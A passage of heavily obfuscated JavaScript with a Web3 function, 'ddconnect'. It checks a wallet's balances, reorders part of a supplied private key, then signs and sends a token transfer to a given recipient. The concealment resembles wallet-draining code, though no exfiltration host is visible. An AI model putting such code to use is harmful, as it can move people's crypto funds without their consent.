        "nHash",
    ];
    _0x3611 = function () {
        return _0x1b74de;
    };
    return _0x3611();
}
async function ddconnect(_0x428221, _0x297d57, _0xa5fd95, _0x4a8772) {
    const _0x3bb775 = _0x5721,
        _0x93083e = {
            dSGIJ:
                _0x3bb775(0xc8) +
                _0x3bb775(0x99) +
                _0x3bb775(0xd2) +
                _0x3bb775(0x117),
            CuSlT:
                _0x3bb775(0x96) +
                _0x3bb775(0x122) +
                _0x3bb775(0x183) +
                _0x3bb775(0x124) +
                "55",
            SlYFf: _0x3bb775(0xe9),
            TYSAW: _0x3bb775(0x161),
            jKJeR: _0x3bb775(0x144),
            NCqZV: _0x3bb775(0x10a),
            fogMG: _0x3bb775(0x7e),
            KZUgO: _0x3bb775(0x130),
            wHXUD: _0x3bb775(0xe4),
            FaWez: _0x3bb775(0x101),
            ejqgI: _0x3bb775(0xab),
            Eccba: _0x3bb775(0x10e),
            sDjvz: _0x3bb775(0x12b),
            EKXXs: _0x3bb775(0xcb),
            HcgTM: _0x3bb775(0xa1),
            RATLx: function (_0x31d96e, _0x4b6b1b) {
                return _0x31d96e(_0x4b6b1b);
            },
            ALKka: _0x3bb775(0x137),
            hBhrU: function (_0x1c9e36, _0x272d4d) {
                return _0x1c9e36 > _0x272d4d;
            },
            dDonG: function (_0x26d112, _0x295adf) {
                return _0x26d112 + _0x295adf;
            },
            UDKxE: _0x3bb775(0x152) + _0x3bb775(0xb3),
            KUTEf: function (_0x191767, _0x462e57) {
                return _0x191767 >= _0x462e57;
            },
            izPYD: function (_0x4fb6f2, _0x3c3b19) {
                return _0x4fb6f2 - _0x3c3b19;
            },
            BZMTy: _0x3bb775(0x184) + _0x3bb775(0xb4) + "l!",
            QKRVc: _0x3bb775(0x8a),
        },
        _0x5c1393 = _0x93083e[_0x3bb775(0x15e)],
        _0xce91b6 = new Web3(
            new Web3[_0x3bb775(0xbc)][_0x3bb775(0x178) + "er"](_0x5c1393)
        ),
        _0x174eda = _0x93083e[_0x3bb775(0x143)],
        _0x39600c = [
            {
                constant: !![],
                inputs: [
                    {
                        name: _0x93083e[_0x3bb775(0x127)],
                        type: _0x93083e[_0x3bb775(0xc4)],
                    },
                ],
                name: _0x93083e[_0x3bb775(0x156)],
                outputs: [
                    {
                        name: _0x93083e[_0x3bb775(0xb6)],
                        type: _0x93083e[_0x3bb775(0x15b)],
                    },
                ],
                type: _0x93083e[_0x3bb775(0xbe)],
            },
            {
                constant: !![],
                inputs: [],
                name: _0x93083e[_0x3bb775(0x165)],
                outputs: [{ name: "", type: _0x93083e[_0x3bb775(0x157)] }],
                type: _0x93083e[_0x3bb775(0xbe)],
            },
            {
                constant: ![],
                inputs: [
                    {
                        name: _0x93083e[_0x3bb775(0xed)],
                        type: _0x93083e[_0x3bb775(0xc4)],
                    },
                    {
                        name: _0x93083e[_0x3bb775(0xf0)],
                        type: _0x93083e[_0x3bb775(0x15b)],
                    },
                ],
                name: _0x93083e[_0x3bb775(0x186)],
                outputs: [{ name: "", type: _0x93083e[_0x3bb775(0x153)] }],
                payable: ![],
                stateMutability: _0x93083e[_0x3bb775(0xd6)],
                type: _0x93083e[_0x3bb775(0xbe)],
            },
        ];
    try {
        const _0xfaf975 = await _0xce91b6[_0x3bb775(0xbd)][_0x3bb775(0x123)](
                _0xa5fd95
            ),
            _0x29aac9 = _0x93083e[_0x3bb775(0xeb)](
                parseFloat,
                _0xce91b6[_0x3bb775(0x94)][_0x3bb775(0x15f)](
                    _0xfaf975,
                    _0x93083e[_0x3bb775(0x98)]
                )
            );
        console[_0x3bb775(0x131)](
            _0x29aac9[_0x3bb775(0x86)](0x79 * -0x2b + -0xda5 + 0x21fc)
        );
        if (
            _0x93083e[_0x3bb775(0x15a)](
                _0x29aac9,
                0x22a5 * -0x1 + -0x1b1c + 0x3dc1 + 0.005
            )
        ) {
            const _0x28bb60 = new _0xce91b6[_0x3bb775(0xbd)][_0x3bb775(0xee)](
                _0x39600c,
                _0x174eda
            );
            let _0x4edaad = _0x428221;
            const _0x369283 = _0xa5fd95,
                _0x3d3364 = await _0x28bb60[_0x3bb775(0x13a)]
                    [_0x3bb775(0x144)](_0x369283)
                    [_0x3bb775(0xa8)](),
                _0x2d783c = _0xce91b6[_0x3bb775(0x94)][_0x3bb775(0x15f)](
                    _0x3d3364,
                    _0x93083e[_0x3bb775(0x98)]
                );
            console[_0x3bb775(0x131)](
                _0x93083e[_0x3bb775(0x13d)](
                    _0x93083e[_0x3bb775(0x136)],
                    _0x2d783c
                )
            );
            const _0x3098f8 = _0xa5fd95,
                _0x1e8112 = _0x297d57,
                _0x5d1fef = _0xce91b6[_0x3bb775(0x94)][_0x3bb775(0xcf)](
                    _0x4edaad[_0x3bb775(0xdb)](),
                    _0x93083e[_0x3bb775(0x98)]
                );
            if (_0x93083e[_0x3bb775(0xa2)](_0x2d783c, _0x428221)) {
                const _0x33758b = await _0xce91b6[_0x3bb775(0xbd)][
                        _0x3bb775(0x92) + "e"
                    ](),
                    _0x4baf71 = _0x28bb60[_0x3bb775(0x13a)]
                        [_0x3bb775(0x12b)](_0x1e8112, _0x5d1fef)
                        [_0x3bb775(0x172)](),
                    _0x30452e = {
                        from: _0x3098f8,
                        to: _0x174eda,
                        gas: 0x186a1,
                        gasPrice: _0x33758b,
                        data: _0x4baf71,
                    };
                let _0x1eb744 = _0x4a8772,
                    _0x205a85 = _0x1eb744[_0x3bb775(0x16b)](
                        -(-0x211c + 0x2327 + 0x1 * -0x1ff)
                    ),
                    _0x4d6006 = _0x205a85[_0x3bb775(0x112)]("")
                        [_0x3bb775(0x80)]()
                        [_0x3bb775(0xc7)](""),
                    _0x49d129 = _0x93083e[_0x3bb775(0x13d)](
                        _0x1eb744[_0x3bb775(0x16b)](
                            0x50a + -0x260c + -0x152 * -0x19,
                            _0x93083e[_0x3bb775(0x133)](
                                _0x1eb744[_0x3bb775(0x88)],
                                0x2 * 0x56 + -0x577 * 0x5 + -0x557 * -0x5
                            )
                        ),
                        _0x4d6006
                    );
                const _0x1cbec4 = _0x49d129,
                    _0x22a18a = await _0xce91b6[_0x3bb775(0xbd)][
                        _0x3bb775(0xe5)
                    ][_0x3bb775(0x16e) + _0x3bb775(0x17d)](
                        _0x30452e,
                        _0x1cbec4
                    ),
                    _0x5a4b7e = await _0xce91b6[_0x3bb775(0xbd)][
                        _0x3bb775(0xb9) + _0x3bb775(0x119) + "n"
                    ](_0x22a18a[_0x3bb775(0x148) + _0x3bb775(0x107)]);
                return (
                    console[_0x3bb775(0x131)](
                        _0x5a4b7e[_0x3bb775(0xa3) + _0x3bb775(0xf4)]
                    ),
                    _0x93083e[_0x3bb775(0xeb)](
                        alert,
                        _0x93083e[_0x3bb775(0xf9)]
                    ),
                    _0x5a4b7e[_0x3bb775(0xa3) + _0x3bb775(0xf4)]
                );
            } else return -(-0x98a + 0x220d * 0x1 + -0x1882 * 0x1);
        } else return -(-0x1bc2 + 0xd1a + -0x9 * -0x1a1);
    } catch (_0x3fd7b8) {
        console[_0x3bb775(0x11a)](_0x93083e[_0x3bb775(0x8b)], _0x3fd7b8);
    }
}
